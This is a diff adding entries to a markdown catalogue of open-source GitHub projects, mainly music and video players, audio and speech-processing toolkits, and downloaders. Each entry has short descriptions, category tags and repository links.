+https://github.com/soimort/you-get
+
+- 🐙 **Source Code:** [https://github.com/soimort/you-get](https://github.com/soimort/you-get)
+- 👤 **Developer:** [soimort](https://github.com/soimort)
+
+
+---
+
+### 📦 Musicfree
+
+> **Categories:** `#typescript` `#free` `#music_player` `#plugin` `#react` `#react_native`
+
+This music player, called MusicFree, is a free, ad-free, and customizable app for Android and Harmony OS. It uses plugins to search, play, and manage music, which means you can access any music source available online with the right plugin. The app is open-source, so it's free and won't collect your personal data. You can customize the look with light or dark modes and custom backgrounds. Be cautious of fake versions and only download from the official sources to avoid scams. The app is maintained by a single developer, so updates might be slow, but it's designed to be safe and functional.
+
+https://github.com/maotoumao/MusicFree
+
+- 🐙 **Source Code:** [https://github.com/maotoumao/MusicFree](https://github.com/maotoumao/MusicFree)
+- 👤 **Developer:** [maotoumao](https://github.com/maotoumao)
+
+
+---
+
 ### 📦 JumpCutter - Speed Up Video Playback by Cutting Silence
 
 > **Categories:** `#Browser` `#Productivity` `#Utilities` `#TypeScript` `#Web` `#Video` `#Interesting` `#Useful` `#GitHub` `#OpenSource`
@@ -2819,6 +4514,96 @@ JumpCutter is a tool that automatically cuts out silence from videos, speeding u
 
 - 🐙 **Source Code:** [https://github.com/WofWca/jumpcutter](https://github.com/WofWca/jumpcutter)
 - 👤 **Developer:** [WofWca](https://github.com/WofWca)
+
+
+---
+
+### 📦 Speechbrain
+
+> **Categories:** `#python` `#asr` `#audio` `#audio_processing` `#deep_learning` `#huggingface` `#language_model` `#pytorch` `#speaker_diarization` `#speaker_recognition` `#speaker_verification` `#speech_enhancement` `#speech_processing` `#speech_recognition` `#speech_separation` `#speech_to_text` `#speech_toolkit` `#speechrecognition` `#spoken_language_understanding` `#transformers` `#voice_recognition` `#GitHub` `#OpenSource`
+
+SpeechBrain is an open-source toolkit that helps you quickly develop Conversational AI technologies, such as speech assistants, chatbots, and language models. It uses PyTorch and offers many pre-trained models and tutorials to make it easy to get started. You can train models for various tasks like speech recognition, speaker recognition, and text processing with just a few lines of code. SpeechBrain also supports GPU training, dynamic batching, and integration with HuggingFace models, making it powerful and efficient. This toolkit is beneficial because it simplifies the development process, provides extensive documentation and tutorials, and is highly customizable, making it ideal for research, prototyping, and educational purposes.
+
+https://github.com/speechbrain/speechbrain
+
+- 🐙 **Source Code:** [https://github.com/speechbrain/speechbrain](https://github.com/speechbrain/speechbrain)
+- 👤 **Developer:** [speechbrain](https://github.com/speechbrain)
+
+
+---
+
+### 📦 Srs
+
+> **Categories:** `#cplusplus` `#audio` `#c` `#c_plus_plus` `#dash` `#hevc` `#hls` `#live` `#live_streaming` `#low_latency` `#media_server` `#multimedia` `#prometheus_exporter` `#rtmp` `#server_side` `#srt` `#streaming` `#video` `#video_conferencing` `#video_streaming` `#webrtc`
+
+SRS (Simple Realtime Server) is a powerful and efficient video server that supports multiple streaming protocols like RTMP, WebRTC, HLS, and more. It works on various operating systems (Linux, Windows, macOS) and hardware architectures. You can easily set it up using Docker and stream videos using tools like FFmpeg or OBS. SRS is free and open-source, licensed under MIT, making it a great choice for developers to build high-quality streaming platforms. It also offers extensive documentation and community support, making it easier to get started and troubleshoot issues.
+
+https://github.com/ossrs/srs
+
+- 🐙 **Source Code:** [https://github.com/ossrs/srs](https://github.com/ossrs/srs)
+- 👤 **Developer:** [ossrs](https://github.com/ossrs)
+
+
+---
+
+### 📦 Matchering
+
+> **Categories:** `#python` `#audio` `#docker_image` `#dsp` `#equalizer` `#filter` `#limiter` `#mastering` `#matchering` `#matching` `#music` `#numpy` `#python_library` `#python3` `#scipy` `#sound` `#spectrum` `#vst`
+
+Matchering 2.0 is a tool that helps make your music sound like your favorite songs. Here’s how it works: you give it two audio files - one you want to master (your song) and another you want it to sound like (a reference song). Matchering then adjusts your song to match the volume, frequency response, peak amplitude, and stereo width of the reference song. This means you can quickly make your music sound professional and consistent, just like popular tracks. You can use it without installation through online services or install it on your computer for more control. It's especially useful for music producers and audio engineers who want to enhance their tracks easily.
+
+https://github.com/sergree/matchering
+
+- 🐙 **Source Code:** [https://github.com/sergree/matchering](https://github.com/sergree/matchering)
+- 👤 **Developer:** [sergree](https://github.com/sergree)
+
+
+---
+
+### 📦 Filestash
+
+> **Categories:** `#javascript` `#ftp` `#ftps` `#git` `#ldap` `#nfs` `#s3` `#sftp` `#smb` `#webdav` `#GitHub` `#OpenSource`
+
+Filestash is a powerful file manager that lets you access and manage your files from anywhere, using various protocols like FTP, SFTP, WebDAV, and more. It supports multiple cloud services such as Dropbox, Google Drive, and Amazon S3. You can use it in your browser, and it's also mobile-friendly. Key features include video and image viewers, audio players, office document support, and customizable plugins. This tool is super fast, user-friendly, and allows you to upload and download files easily. It's beneficial because it centralizes your file management, making it easy to access and share files across different platforms.
+
+https://github.com/mickael-kerjean/filestash
+
+- 🐙 **Source Code:** [https://github.com/mickael-kerjean/filestash](https://github.com/mickael-kerjean/filestash)
+- 👤 **Developer:** [mickael-kerjean](https://github.com/mickael-kerjean)
+
+
+---
+
+### 📦 Saltplayersource
+
+> **Categories:** `#other`
+
+Salt Player is a local music player app used by hundreds of thousands of users. You can download it for Android devices with Android 6.0 or higher, and it supports different architectures. The app is available on various channels like GitHub, Google Play, and Chinese app stores. It offers features like support for MIUI, vivo, and Meizu systems, but some features are not supported on all devices. The app is regularly updated, and you can check the version details to know what's new. Using Salt Player allows you to play your local music files efficiently and enjoy additional features depending on your device. Make sure to download from official channels to avoid unknown sources.
+
+https://github.com/Moriafly/SaltPlayerSource
+
+- 🐙 **Source Code:** [https://github.com/Moriafly/SaltPlayerSource](https://github.com/Moriafly/SaltPlayerSource)
+- 👤 **Developer:** [Moriafly](https://github.com/Moriafly)
+
+
+---
+
+### 📦 Maaassistantarknights
+
+> **Categories:** `#cplusplus` `#arknights` `#computer_vision` `#maa`
+
+MAA Assistant Arknights is a powerful tool designed to help players of the game "Arknights" automate daily tasks. It uses image recognition technology to complete tasks such as daily missions, recruiting operators, and managing base facilities. The tool supports multiple platforms including Windows, Linux, and macOS.
+
+Using MAA Assistant Arknights, you can automatically complete daily routines like collecting credits, shopping, and receiving rewards. It also helps in identifying operator lists, tracking materials needed for development, and optimizing base scheduling. The tool integrates with various platforms like Penguin Logistics and Yituliu to upload data and plan strategies.
+
+By using this assistant, you save time and effort by automating repetitive tasks, allowing you to focus on other aspects of the game or your daily life. Additionally, it supports multiple languages and has an active community for support and development contributions.
+
+Overall, MAA Assistant Arknights makes playing Arknights more efficient and enjoyable by handling mundane tasks automatically.
+
+https://github.com/MaaAssistantArknights/MaaAssistantArknights
+
+- 🐙 **Source Code:** [https://github.com/MaaAssistantArknights/MaaAssistantArknights](https://github.com/MaaAssistantArknights/MaaAssistantArknights)
+- 👤 **Developer:** [MaaAssistantArknights](https://github.com/MaaAssistantArknights)
 
 
 ---
@@ -2865,6 +4650,59 @@ Create custom dice
 
 ---
 
+### 📦 Lineupx
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+This is a set of instructions that the player follows to throw a grenade. They are used in many FPS games such as Counter-Strike, Valorant and Overwatch.
+
+**4️⃣**** **[**GitHub**](https://t.me/github_tg)
+
+- 🐙 **Source Code:** [https://github.com/shimupan/lineupx](https://github.com/shimupan/lineupx)
+- 👤 **Developer:** [shimupan](https://github.com/shimupan)
+
+
+---
+
+### 📦 WinampDesktop/winamp
+
+> **Categories:** `#llama` `#media` `#player` `#winamp`
+
+Iconic media player
+**Language**: C++
+
+- 🐙 **Source Code:** [https://github.com/WinampDesktop/winamp](https://github.com/WinampDesktop/winamp)
+- 👤 **Developer:** [WinampDesktop](https://github.com/WinampDesktop)
+
+
+---
+
+### 📦 leerob/next-music-player
+
+> **Categories:** `#nextjs` `#GitHub` `#OpenSource`
+
+A blazing fast, information dense media player built with Next.js.
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/leerob/next-music-player](https://github.com/leerob/next-music-player)
+- 👤 **Developer:** [leerob](https://github.com/leerob)
+
+
+---
+
+### 📦 SuperViz/superviz
+
+> **Categories:** `#autodesk` `#autodesk_forge` `#collaboration` `#comments` `#crdt` `#matterport` `#multiplayer` `#presence` `#react` `#reactflow` `#real_time` `#superviz` `#three` `#video_conferencing` `#webrtc` `#websockets` `#yjs` `#yjs_provider` `#GitHub` `#OpenSource`
+
+SuperViz provides programmable low-code Collaboration and Communication components for web applications.
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/SuperViz/superviz](https://github.com/SuperViz/superviz)
+- 👤 **Developer:** [SuperViz](https://github.com/SuperViz)
+
+
+---
+
 ### 📦 mpvKt
 
 > **Categories:** `#Android` `#Player`
@@ -2888,6 +4726,19 @@ A media player for Android based on mpv-android aiming to provide a nicer user i
 🏷️ #Android #Player
 
 - 🐙 **Source Code:** [https://github.com/abdallahmehiz/mpvKt](https://github.com/abdallahmehiz/mpvKt)
+
+
+---
+
+### 📦 jishengpeng/WavTokenizer
+
+> **Categories:** `#acoustic` `#audio_representation` `#codec` `#dac` `#encodec` `#gpt4o` `#music_representation_learning` `#semantic` `#soundstream` `#speech_language_model` `#speech_representation` `#text_to_speech`
+
+SOTA discrete acoustic codec models with 40 tokens per second for audio language modeling
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/jishengpeng/WavTokenizer](https://github.com/jishengpeng/WavTokenizer)
+- 👤 **Developer:** [jishengpeng](https://github.com/jishengpeng)
 
 
 ---
@@ -3068,6 +4919,20 @@ Features
 
 ---
 
+### 📦 Papermusic
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+To run Papermusic, users need to place a hand-drawn musical instrument in front of a webcam, with the notes clearly written on it.
+
+**4️⃣**** **[**GitHub**](https://t.me/+rB2DxiwI4X5iYjcy)
+
+- 🐙 **Source Code:** [https://github.com/askmeegs/papermusic](https://github.com/askmeegs/papermusic)
+- 👤 **Developer:** [askmeegs](https://github.com/askmeegs)
+
+
+---
+
 ### 📦 Lucida
 
 > **Categories:** `#Website`
@@ -3177,6 +5042,69 @@ Fast audio player, recorder, converter for Windows, Linux & Android.
 
 ---
 
+### 📦 jthlim/impulse-tracker
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Original source code for Impulse Tracker, a music tracker for DOS
+**Language**: Assembly
+**Stars**: 269 **Issues**: 0 **Forks**: 10
+[https://github.com/jthlim/impulse-tracker](https://github.com/jthlim/impulse-tracker)
+
+- 🐙 **Source Code:** [https://github.com/jthlim/impulse-tracker](https://github.com/jthlim/impulse-tracker)
+- 👤 **Developer:** [jthlim](https://github.com/jthlim)
+
+
+---
+
+### 📦 10 GitHub Repositories to Master SQL
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+10 GitHub repositories that can help you get started with SQL and database management and even take your skills to the next level. This list is for beginners and professionals who are looking to improve their data-handling skills.
+
+1.** SQL 101 by s-shemmee**
+https://github.com/s-shemmee/SQL-101
+
+2. **Learn SQL by WebDevSimplified**
+https://github.com/WebDevSimplified/Learn-SQL
+
+3. **SQL Masterclass by datawithdanny**
+https://github.com/datawithdanny/sql-masterclass
+
+4. **SQL Map by sqlmapproject**
+https://github.com/sqlmapproject/sqlmap
+
+5. **SQL Server Samples by Microsoft**
+https://github.com/microsoft/sql-server-samples
+
+6. **SQL Music Store Analysis Project by rishabhnmishra**
+https://github.com/rishabhnmishra/SQL_Music_Store_Analysis
+
+7. **Data Engineering Zoomcamp by DataTalksClub**
+https://github.com/DataTalksClub/data-engineering-zoomcamp
+
+8. **SQL Server Kit by ktaranov**
+https://github.com/ktaranov/sqlserver-kit
+
+9. **Awesome DB Tools by mgramin**
+https://github.com/mgramin/awesome-db-tools
+
+10. **SQL for Wary Data Scientists by gvwilson**
+https://github.com/gvwilson/sql-tutorial
+
+
+➖➖➖➖➖➖➖➖➖➖➖➖➖➖
+Join @github_repositories_bds for more cool repositories.
+*This channel belongs to @bigdataspecialist group
+
+- 🐙 **Source Code:** [https://github.com/s-shemmee/SQL-101](https://github.com/s-shemmee/SQL-101)
+- 🌐 **Official Website:** [https://github.com/WebDevSimplified/Learn-SQL](https://github.com/WebDevSimplified/Learn-SQL)
+- 👤 **Developer:** [s-shemmee](https://github.com/s-shemmee)
+
+
+---
+
 ### 📦 Echo Music [Nightly]
 
 > **Categories:** `#Android` `#Music`
@@ -3184,6 +5112,19 @@ Fast audio player, recorder, converter for Windows, Linux & Android.
 An Extension (Spotify, Youtube Music, Deezer Music) based Music Player for Android, with a clean and simple UI.
 
 - 🐙 **Source Code:** [https://github.com/brahmkshatriya/echo](https://github.com/brahmkshatriya/echo)
+
+
+---
+
+### 📦 BradyFU/Video-MME
+
+> **Categories:** `#large_language_models` `#large_vision_language_models` `#mme` `#multimodal_large_language_models` `#video` `#video_mme`
+
+✨✨Video-MME: The First-Ever Comprehensive Evaluation Benchmark of Multi-modal LLMs in Video Analysis
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/BradyFU/Video-MME](https://github.com/BradyFU/Video-MME)
+- 👤 **Developer:** [BradyFU](https://github.com/BradyFU)
 
 
 ---
@@ -3199,6 +5140,20 @@ mpv-android is a video player for Android based on libmpv.
 
 ---
 
+### 📦 sebjvidal/Apple-Music-UI-Demo
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+**Language**: Swift
+**Stars**: 177 **Issues**: 0 **Forks**: 10
+[https://github.com/sebjvidal/Apple-Music-UI-Demo](https://github.com/sebjvidal/Apple-Music-UI-Demo)
+
+- 🐙 **Source Code:** [https://github.com/sebjvidal/Apple-Music-UI-Demo](https://github.com/sebjvidal/Apple-Music-UI-Demo)
+- 👤 **Developer:** [sebjvidal](https://github.com/sebjvidal)
+
+
+---
+
 ### 📦 Lidarr
 
 > **Categories:** `#Linux` `#Windows`
@@ -3206,6 +5161,55 @@ mpv-android is a video player for Android based on libmpv.
 Lidarr is a music collection manager for Usenet and BitTorrent users. It can monitor multiple RSS feeds for new tracks from your favorite artists and will grab, sort and rename them. It can also be configured to automatically upgrade the quality of files already downloaded when a better quality format becomes available.
 
 - 🐙 **Source Code:** [https://lidarr.audio/discord](https://lidarr.audio/discord)
+
+
+---
+
+### 📦 Audiojs
+
+> **Categories:** `#Audio` `#Flash` `#HTML`
+
+It is possible to customize the appearance of the player.
+
+If the browser does not support the audio tag, Flash capabilities will be used.
+
+⤷ [**Link to project**](https://github.com/kolber/audiojs)
+
+📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Audio #Flash #HTML
+
+- 🐙 **Source Code:** [https://github.com/kolber/audiojs](https://github.com/kolber/audiojs)
+- 👤 **Developer:** [kolber](https://github.com/kolber)
+
+
+---
+
+### 📦 glanceapp/glance
+
+> **Categories:** `#dashboard` `#docker` `#feed_reader` `#golang` `#homepage` `#rss` `#self_hosted` `#github` `#SelfHosted` `#Productivity` `#go` `#aggregator` `#homelab` `#monitoring` `#reddit` `#rss_reader` `#startpage` `#youtube` `#OpenSource`
+
+A selfhosted dashboard that puts all your feeds in one place
+**Language**: Go
+
+- 🐙 **Source Code:** [https://github.com/glanceapp/glance](https://github.com/glanceapp/glance)
+- 🌐 **Official Website:** [https://github.com/open-webui/open-webui](https://github.com/open-webui/open-webui)
+- 👤 **Developer:** [glanceapp](https://github.com/glanceapp)
+
+
+---
+
+### 📦 Ardour
+
+> **Categories:** `#Audio` `#Useful`
+
+**
+offers tools for cutting, moving, stretching, copying, pasting and deleting. It has a flexible mixer architecture and hundreds of plugins. Offers powerful signal routing capabilities.
+
+**⤷ **[**Link to project**](https://github.com/Ardour/ardour)
+
+📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Audio #Useful
+
+- 🐙 **Source Code:** [https://github.com/Ardour/ardour](https://github.com/Ardour/ardour)
+- 👤 **Developer:** [Ardour](https://github.com/Ardour)
 
 
 ---
@@ -3226,6 +5230,22 @@ The Game of Life, also known simply as "Life", is a cellular automaton developed
 🎁 [Donate to our admins](https://t.me/popMODS/4195)
 
 - 🐙 **Source Code:** [https://github.com/Efimj/GameOfLife](https://github.com/Efimj/GameOfLife)
+
+
+---
+
+### 📦 Pyzam
+
+> **Categories:** `#Audio` `#Shazam` `#Useful` `#GitHub` `#OpenSource`
+
+Uses the Shazam API, so known limitations include a call limit of 20 requests per minute and a sampling limit of 12 seconds per request.
+**
+⤷ **[**Link to project**](https://github.com/lukafilipxvic/Pyzam)
+
+📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Audio #Shazam #Useful
+
+- 🐙 **Source Code:** [https://github.com/lukafilipxvic/Pyzam](https://github.com/lukafilipxvic/Pyzam)
+- 👤 **Developer:** [lukafilipxvic](https://github.com/lukafilipxvic)
 
 
 ---
@@ -3251,6 +5271,70 @@ Nekoflix, your all-in-one destination for anime and manga enthusiasts! With Neko
 
 ---
 
+### 📦 Btfs
+
+> **Categories:** `#Bit` `#Useful`
+
+Tools such as ls, cat and cp work as expected. Applications like vlc and mplayer can also run without modification.
+
+**⤷ **[**Link to project**](https://github.com/johang/btfs)
+
+📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Bit #Useful
+
+- 🐙 **Source Code:** [https://github.com/johang/btfs](https://github.com/johang/btfs)
+- 👤 **Developer:** [johang](https://github.com/johang)
+
+
+---
+
+### 📦 Skip Yt Ad
+
+> **Categories:** `#Useful` `#Youtube`
+
+Features include skipping multiple ads, running smoothly in the background, light and easy to use, and skipping YT surveys. The extension skips ads in less than 100 milliseconds.
+
+⤷** **[**Link to project**](https://github.com/dikshantrajput/skip-yt-ad)
+
+😸[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Useful #Youtube
+
+- 🐙 **Source Code:** [https://github.com/dikshantrajput/skip-yt-ad](https://github.com/dikshantrajput/skip-yt-ad)
+- 👤 **Developer:** [dikshantrajput](https://github.com/dikshantrajput)
+
+
+---
+
+### 📦 Detonator
+
+> **Categories:** `#2D` `#Useful` `#Linux` `#OpenGL`
+
+Designed for simple single-player games such as puzzles, platformers and tile-based real-time strategy games.
+
+**⤷ **[**Link to project**](https://github.com/ensisoft/detonator)
+
+📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #2D #Useful #Linux #OpenGL
+
+- 🐙 **Source Code:** [https://github.com/ensisoft/detonator](https://github.com/ensisoft/detonator)
+- 👤 **Developer:** [ensisoft](https://github.com/ensisoft)
+
+
+---
+
+### 📦 Multi Modal Starter Kit
+
+> **Categories:** `#AI` `#Interesting` `#Video`
+
+Takes just a few frames as a basis. Works with models such as LLaVa, LLaVa-vicuna, BakLLaVA, GPT-4v.
+
+**⤷ **[**Link to project**](https://github.com/tigrisdata-community/multi-modal-starter-kit)
+
+📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #AI #Interesting #Video
+
+- 🐙 **Source Code:** [https://github.com/tigrisdata-community/multi-modal-starter-kit](https://github.com/tigrisdata-community/multi-modal-starter-kit)
+- 👤 **Developer:** [tigrisdata-community](https://github.com/tigrisdata-community)
+
+
+---
+
 ### 📦 Auto Airplane Mode
 
 > **Categories:** `#Android` `#Root` `#ADB`
@@ -3267,6 +5351,37 @@ Schedule airplane mode based on your settings, e.g. by date/time.
 🎁 [Donate to our admins](https://t.me/popMODS/4195)
 
 - 🐙 **Source Code:** [https://github.com/MBach/AutoAirplaneMode](https://github.com/MBach/AutoAirplaneMode)
+
+
+---
+
+### 📦 Bash Video
+
+> **Categories:** `#Bash` `#Video` `#Useful`
+
+The script facilitates operations such as cutting, splicing, changing playback speed, optimizing video size, trimming, extracting audio, adding audio, resizing, rotating, recording screen, adding subtitles, applying video filters and much more.
+
+⤷** **[**Link to project**](https://github.com/allen-munsch/bash-video)
+
+📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Bash #Video #Useful
+
+- 🐙 **Source Code:** [https://github.com/allen-munsch/bash-video](https://github.com/allen-munsch/bash-video)
+- 👤 **Developer:** [allen-munsch](https://github.com/allen-munsch)
+
+
+---
+
+### 📦 DoMusic/Hybrid-Net
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Real-time audio source separation, generate lyrics, chords, beat.
+**Language**: Python
+**Stars**: 506 **Issues**: 0 **Forks**: 19
+[https://github.com/DoMusic/Hybrid-Net](https://github.com/DoMusic/Hybrid-Net)
+
+- 🐙 **Source Code:** [https://github.com/DoMusic/Hybrid-Net](https://github.com/DoMusic/Hybrid-Net)
+- 👤 **Developer:** [DoMusic](https://github.com/DoMusic)
 
 
 ---
@@ -3293,6 +5408,70 @@ GPT powered playlist App for Android. Supports Apple Music, Spotify, and Youtube
 
 ---
 
+### 📦 Cryptoframe
+
+> **Categories:** `#Security` `#Interesting` `#Video`
+
+It allows users to embed hidden text messages in video files. Uses seven levels of AES-256 encryption in CBC mode, protected by RSA encryption. Supports almost all input video formats.
+
+**⤷ **[**Link to project**](https://github.com/x011/CryptoFrame)**
+**
+🐱 [GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Security #Interesting #Video
+
+- 🐙 **Source Code:** [https://github.com/x011/CryptoFrame](https://github.com/x011/CryptoFrame)
+- 👤 **Developer:** [x011](https://github.com/x011)
+
+
+---
+
+### 📦 Cmdf
+
+> **Categories:** `#Youtube` `#Useful` `#GitHub` `#OpenSource`
+
+Uses features of whisper.cpp. To process the video, use the F9 hotkey, after pressing which the background decryption of the video will begin. Once the video is processed, press Cmd + F, enter your query and press F10.
+
+**⤷ **[**Link to project**](https://github.com/dotvignesh/CmdF)
+
+[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Youtube #Useful
+
+- 🐙 **Source Code:** [https://github.com/dotvignesh/CmdF](https://github.com/dotvignesh/CmdF)
+- 👤 **Developer:** [dotvignesh](https://github.com/dotvignesh)
+
+
+---
+
+### 📦 Whisper Clip
+
+> **Categories:** `#Interesting` `#Tool` `#Audio` `#AI` `#GitHub` `#OpenSource`
+
+It uses OpenAI's Whisper and includes recording, transcribing audio, and saving the transcription to the clipboard.
+
+**⤷ **[**Link to project**](https://github.com/gustavostz/whisper-clip)
+
+[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Tool #Audio #AI
+
+- 🐙 **Source Code:** [https://github.com/gustavostz/whisper-clip](https://github.com/gustavostz/whisper-clip)
+- 👤 **Developer:** [gustavostz](https://github.com/gustavostz)
+
+
+---
+
+### 📦 MoneyPrinter
+
+> **Categories:** `#GitHub` `#OpenSource` `#python` `#automation` `#cli` `#json` `#money` `#outreach` `#twitter` `#youtube`
+
+**Automate Creation of YouTube Shorts using MoviePy.
+
+Creator: FujiwaraChoki
+Stars ⭐️: 7.1k
+Forked By: 844
+
+- 🐙 **Source Code:** [https://github.com/FujiwaraChoki/MoneyPrinter](https://github.com/FujiwaraChoki/MoneyPrinter)
+- 👤 **Developer:** FujiwaraChoki
+
+
+---
+
 ### 📦 ThemeSong for YouTube Music (Enhancer)
 
 > **Categories:** `#Windows` `#Extension`
@@ -3313,6 +5492,23 @@ Enhancer for YouTube Music™. Dynamic Themes, Visualizers, Side Panel Mini Play
 - **Side Panel Player** — Mini-player on your browser side panel
 
 </details>
+
+
+---
+
+### 📦 Navidrome
+
+> **Categories:** `#Interesting` `#Music` `#Manager` `#Useful` `#GitHub` `#OpenSource`
+
+**
+It lets you enjoy your music collection from anywhere, making it accessible through a modern web interface and a range of mobile apps available for both iOS and Android devices.
+
+**⤷ **[**Link to project**](https://github.com/navidrome/navidrome)
+
+[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Music #Manager #Useful
+
+- 🐙 **Source Code:** [https://github.com/navidrome/navidrome](https://github.com/navidrome/navidrome)
+- 👤 **Developer:** [navidrome](https://github.com/navidrome)
 
 
 ---
@@ -3349,6 +5545,19 @@ __🛠️ Features__
 
 ---
 
+### 📦 xNul/palworld-host-save-fix
+
+> **Categories:** `#bugfix` `#co_op` `#dedicated_server` `#multiplayer` `#palworld` `#palworld_dedicated_server` `#steam`
+
+Fixes the bug which forces a player to create a new character when they already have a save. Useful for migrating maps from co-op to dedicated servers and from one dedicated server to another.
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/xNul/palworld-host-save-fix](https://github.com/xNul/palworld-host-save-fix)
+- 👤 **Developer:** [xNul](https://github.com/xNul)
+
+
+---
+
 ### 📦 MusicSearch
 
 > **Categories:** `#Android` `#MacOS` `#Linux` `#Windows` `#Music`
@@ -3356,6 +5565,22 @@ __🛠️ Features__
 An Android app for browsing songs, artists, and anything related to them using [MusicBrainz's API](https://wiki.musicbrainz.org/MusicBrainz_API).
 
 - 🐙 **Source Code:** [https://github.com/lydavid/MusicSearch](https://github.com/lydavid/MusicSearch)
+
+
+---
+
+### 📦 Youtube Channel Archiver
+
+> **Categories:** `#Interesting` `#Video` `#GitHub` `#OpenSource`
+
+**Automates downloads of videos, previews and comments from the target channel (or channels).**
+
+⤷ **[**Link to project**](https://github.com/dmn001/youtube_channel_archiver)
+
+[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Video
+
+- 🐙 **Source Code:** [https://github.com/dmn001/youtube_channel_archiver](https://github.com/dmn001/youtube_channel_archiver)
+- 👤 **Developer:** [dmn001](https://github.com/dmn001)
 
 
 ---
@@ -3383,6 +5608,23 @@ Open-Source application that does not require registration and all content is fr
 
 ---
 
+### 📦 OpenVoice
+
+> **Categories:** `#GitHub` `#OpenSource` `#readme` `#text_to_speech` `#tts` `#voice_clone` `#zero_shot_tts` `#python` `#Interesting` `#AI` `#Tool` `#Useful` `#Audio`
+
+**Instant voice cloning by MyShell.
+
+Creator: myshell-ai
+Stars ⭐️: 7.8k
+Forked By: 542
+
+- 🐙 **Source Code:** [https://github.com/myshell-ai/OpenVoice](https://github.com/myshell-ai/OpenVoice)
+- 🌐 **Official Website:** [https://github.com/myshell-ai/OpenVoice#readme](https://github.com/myshell-ai/OpenVoice#readme)
+- 👤 **Developer:** myshell-ai
+
+
+---
+
 ### 📦 ([EP](https://t.me/popMODS/1374)) **Cloudstream
 
 > **Categories:** `#Android` `#Media` `#Streaming` `#cloudstream` `#cloud`
@@ -3402,6 +5644,19 @@ CloudStream is an app that allows you to stream and download movies, TV series, 
 Pinokio is an AI platform that lets you create amazing things with various tools, such as voice cloning, face swapping, animation, and more . You can use Pinokio on any OS, and it is loved by artists and designers . You don’t need to deal with complicated installs, slow servers, or long queues - just download Pinokio here, pick the tools you want and start making music, sounds and images on your own computer. Pinokio is also an open-source AI browser that you can help improve on GitHub
 
 - 🐙 **Source Code:** [https://pinokio.computer](https://pinokio.computer)
+
+
+---
+
+### 📦 TuneNN/TuneNN
+
+> **Categories:** `#audio` `#machine_learning` `#music` `#pitch_detection` `#pitch_estimation`
+
+A transformer-based network model for pitch detection
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/TuneNN/TuneNN](https://github.com/TuneNN/TuneNN)
+- 👤 **Developer:** [TuneNN](https://github.com/TuneNN)
 
 
 ---
@@ -3608,6 +5863,22 @@ Muffon is a cross-platform music streaming client for desktop, which helps you 
 
 ---
 
+### 📦 Speech Condenser
+
+> **Categories:** `#Interesting` `#Video`
+
+The process includes audio extraction, speaker diarization, audio separation, speech-to-text transcription, and AI summarization.
+
+⤷ [Project link](https://github.com/nezhar/speech-condenser)
+
+[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Video
+
+- 🐙 **Source Code:** [https://github.com/nezhar/speech-condenser](https://github.com/nezhar/speech-condenser)
+- 👤 **Developer:** [nezhar](https://github.com/nezhar)
+
+
+---
+
 ### 📦 Mousai** and **SongRec
 
 > **Categories:** `#installation` `#Linux` `#AsYouWish` `#Interesting` `#Rust`
@@ -3725,6 +5996,16 @@ An open source alternative to Google Files android app.
 - Restore / delete permanently based on max number of files / maximum days / maximum size
 
 </details>
+
+
+---
+
+### 📦 huggingface/distil-whisper
+
+> **Categories:** `#audio` `#speech_recognition` `#whisper`
+
+- 🐙 **Source Code:** [https://github.com/huggingface/distil-whisper](https://github.com/huggingface/distil-whisper)
+- 👤 **Developer:** [huggingface](https://github.com/huggingface)
 
 
 ---
@@ -4182,6 +6463,36 @@ Six different single and multi-player versions of games based on classic retro t
 
 ---
 
+### 📦 Daktilo
+
+> **Categories:** `#Interesting` `#Useful` `#GitHub` `#OpenSource`
+
+It offers various presets such as classic typewriter effect, music box random notes and quack
+
+⤷ [Project link](https://github.com/orhun/daktilo)
+
+[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Useful
+
+- 🐙 **Source Code:** [https://github.com/orhun/daktilo](https://github.com/orhun/daktilo)
+- 👤 **Developer:** [orhun](https://github.com/orhun)
+
+
+---
+
+### 📦 developerrahulofficial/jennie-anime-player
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+**Language**: TypeScript
+**Stars**: 166 **Issues**: 6 **Forks**: 52
+[https://github.com/developerrahulofficial/jennie-anime-player](https://github.com/developerrahulofficial/jennie-anime-player)
+
+- 🐙 **Source Code:** [https://github.com/developerrahulofficial/jennie-anime-player](https://github.com/developerrahulofficial/jennie-anime-player)
+- 👤 **Developer:** [developerrahulofficial](https://github.com/developerrahulofficial)
+
+
+---
+
 ### 📦 📽️🔧 Cobalt Tools
 
 > **Categories:** `#Web` `#Website` `#Tools` `#github` `#svelte` `#collaboration` `#downloader` `#javascript` `#music` `#reddit` `#social_media` `#soundcloud` `#tiktok` `#twitter` `#typescript` `#video` `#vimeo` `#vk` `#webapp` `#youtube` `#youtube_downloader` `#OpenSource`
@@ -4206,6 +6517,19 @@ Six different single and multi-player versions of games based on classic retro t
 - 🐙 **Source Code:** [https://github.com/wukko/cobalt](https://github.com/wukko/cobalt)
 - 🌐 **Official Website:** [https://t.me/popCLOUDS/1801](https://t.me/popCLOUDS/1801)
 - 👤 **Developer:** [Imputnet](https://github.com/imputnet)
